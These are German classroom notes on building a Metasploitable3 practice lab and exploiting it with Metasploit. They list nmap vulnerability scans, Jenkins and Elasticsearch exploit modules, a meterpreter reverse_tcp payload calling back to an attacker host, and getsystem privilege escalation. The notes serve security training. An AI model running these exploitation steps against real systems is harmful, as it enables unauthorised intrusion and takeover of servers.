# **Mitschrift**
#### **Datum: 06.05.2020**
### **Thema: BitTorrent**
---
## Split-Kommand
---
## Orf-Beitrag 
---
## **Main-Part** 

### Downloads
- [Vagrant](https://www.vagrantup.com/downloads.html)
- [Git Repo Metasploitable3](https://github.com/rapid7/metasploitable3.git)
### Anleitung 
- [Anleitung](https://liberty-shell.com/sec/2018/07/08/install-ms3/)


Richtige Anleitung
````
mkdir metasploitable3-workspace
cd metasploitable3-workspace
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/rapid7/metasploitable3/master/Vagrantfile" -OutFile "Vagrantfile"
vagrant up
````
Alles in der Powershell eingeben

## Weiter sind wir nicht am Vormittag gekommen
---
# Nachmittag

1. msfconsole
2. neuer tab
3. ip a
4. ls -l 
5. nmap -sV -sC --script vuln -oN dsofsdf.nmap 
6. db_status
7. workspace -a msp3win
8. db_nmap 192.168.0.130 
9. db_nmap 192.168.0.130  -p 8484, 8585

angreifer (kali): 192.168.178.34
windows server: 192.168.178.37



1. search jenskins // um nach exploits zu suchen
2. use [name] 
3. options
4. set targeturi /
5. set rport 8484
6. run 
--
7. grep exploit search jenkins 
8. use [name]
9. options 
10. set rport 8484
11. set targeturi /
12. info 
13. setg  rhost 
14. set payload windows/meterpreter/reverse_tcp
15. options
16. set lhost 192.168.0.132 (kali)
17. set lport 5555
18. set rport 8484
19. exploit
--- Zugriff Terminal 
19. ps 
20. ?
21. getuid
22. getsystem
23. background 
24. search elastisticsearch 
25. use [name]
26. options 
27. info
28. set LPORT 9999 
29. exploit 
30. getuid 